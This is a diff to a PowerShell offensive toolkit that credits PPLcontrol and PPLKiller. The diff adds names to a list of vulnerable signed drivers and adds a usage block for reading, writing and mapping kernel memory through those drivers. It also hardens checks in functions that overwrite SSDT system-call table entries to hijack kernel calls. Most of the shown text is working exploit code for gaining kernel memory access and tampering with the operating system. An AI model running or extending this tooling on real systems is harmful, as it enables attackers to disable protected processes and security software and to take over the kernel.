@@ -23,6 +23,7 @@ using namespace System.Windows.Forms
 # Based on IDea from PPLcontrol / PPLKiller
 # https://github.com/itm4n/PPLcontrol
 # https://github.com/RedCursorSecurityConsulting/PPLKiller
+# Other source's i used / read forget to mention here
 
 <#
  # ~~~~~~~~~~~~~~~~~~~~~~~~ @
@@ -68,7 +69,8 @@ using namespace System.Windows.Forms
             "AsrDrv107", "Pmxdrv", "pmxdrv64", "MyPortIO_x64", "MyPortIO0",
             "athpexnt", "MonProcessEX", "ktapi", "shdrv_x64", "shdrv",
             "signed", "WinNotify", "DCRCVDrv", "DCRCVDRV_U", "PSKD64",
-            "RootLaser", "ZyArk", "ZYArKit", "Alinubx", "ardrv"
+            "RootLaser", "ZyArk", "ZYArKit", "Alinubx", "ardrv", 
+            "PCTcore64", "PCTCoreDevice"
 
  $Binary | % {
     $DriverPath = Join-Path -Path $SourceDir -ChildPath "$_.sys"
@@ -89,6 +91,41 @@ using namespace System.Windows.Forms
         }
     }
  }
+#>
+
+<#
+Driver With Translator
+- CorMem
+
+Driver With Translator, Read, Write / MAP
+- gibepext
+- BiosToolCommonDriver
+
+# Copy VA<>VA using memmove, memcpy
+Read-VirtualAddress  -VA $va -BlockSize 0x10
+Write-VirtualAddress -VA $va -Value $value
+
+# Copy VA<>VA using memmove, memcpy
+Read-KernelMemory  -VA $va -Size 0x10    -Mode BiosToolCommonDriver
+Write-KernelMemory -VA $va -Value $value -Mode BiosToolCommonDriver
+
+# Map Address to user address using ZwMapViewOfSection
+$va = Map-VirtualAddress -VA $TargetAddress -BlockSize 0x10 -DriverName mtxvxd # ktapi
+if ($va) {
+    [Marshal]::WriteInt64($va, 0L)
+    Unmap-VirtualAddress -MappedAddress $va -DriverName MtxVxd | Out-Null
+}
+
+# Copy VA<>VA using MmMapIoSpace & memmove, memcpy
+Read-KernelMemory  -VA $va -Size 0x10    -Mode gibepext
+Write-KernelMemory -VA $va -Value $value -Mode gibepext
+
+# Re-map VA<>PA using MmMapIoSpace [Aka Bind-KernelAddress]
+$MapObj = Map-KernelMemory -VA $VA -Size 0x10 -Mode gibepext -CacheType MmCached
+if ($MapObj -and $MapObj.MappedAddress -ne 0) {
+    Write-VirtualAddress -VA $MapObj.MappedAddress -Int 0x0 | Out-Null
+    Free-IntPtr -handle $MapObj.Device -Method NtHandle
+}
 #>
 
 # Update Process By ID
@@ -3606,7 +3643,7 @@ try {
         -VA (Get-KernelBaseAddress) `
         -Size 200 -Mode gibepext `
         -CacheType MmCached
-    if ($MapObj.MappedAddress -ne 0) {
+    if ($MapObj -and $MapObj.MappedAddress -ne 0) {
         Read-KernelMemory `
             -VA $MapObj.MappedAddress `
             -AsByte
@@ -3623,7 +3660,7 @@ try {
         -VA (Get-KernelBaseAddress) `
         -Size 96 -Mode LECOMA `
         -CacheType MmCached
-    if ($MapObj.MappedAddress -ne 0) {
+    if ($MapObj -and $MapObj.MappedAddress -ne 0) {
         Format-HexView `
             -Address $MapObj.MappedAddress `
             -Size 96 `
@@ -7192,7 +7229,7 @@ Function Invoke-SsdtShadowCallHijack {
     }
 
     $MapObj = Map-KernelMemory -VA $EntryAddress -Size 4 -Mode gibepext -CacheType MmCached
-    if ($MapObj.MappedAddress -ne 0) {
+    if ($MapObj -and $MapObj.MappedAddress -ne 0) {
         Write-VirtualAddress -VA $MapObj.MappedAddress -Int $NewEncodedEntry | Out-Null
         Free-IntPtr -handle $MapObj.Device -Method NtHandle
     }
@@ -7209,7 +7246,7 @@ Function Invoke-SsdtShadowCallHijack {
     }
     finally {
         $MapObj = Map-KernelMemory -VA $EntryAddress -Size 4 -Mode gibepext -CacheType MmCached
-        if ($MapObj.MappedAddress -ne 0) {
+        if ($MapObj -and $MapObj.MappedAddress -ne 0) {
             Write-VirtualAddress -VA $MapObj.MappedAddress -Int $EncodedEntry | Out-Null
             Free-IntPtr -handle $MapObj.Device -Method NtHandle
         }
@@ -7361,7 +7398,7 @@ Function Invoke-SsdtNtCallHijack {
                 -VA $EntryAddress `
                 -Size 4 -Mode gibepext `
                 -CacheType MmCached
-            if ($MapObj.MappedAddress -ne 0) {
+            if ($MapObj -and $MapObj.MappedAddress -ne 0) {
                 $HR = Write-VirtualAddress `
                     -VA $MapObj.MappedAddress `
                     -Int $NewOffset
@@ -7405,7 +7442,7 @@ Function Invoke-SsdtNtCallHijack {
                     -VA $EntryAddress `
                     -Size 4 -Mode gibepext `
                     -CacheType MmCached
-                if ($MapObj.MappedAddress -ne 0) {
+                if ($MapObj -and $MapObj.MappedAddress -ne 0) {
                     $HR = Write-VirtualAddress `
                         -VA $MapObj.MappedAddress `
                         -Int $EntryValue
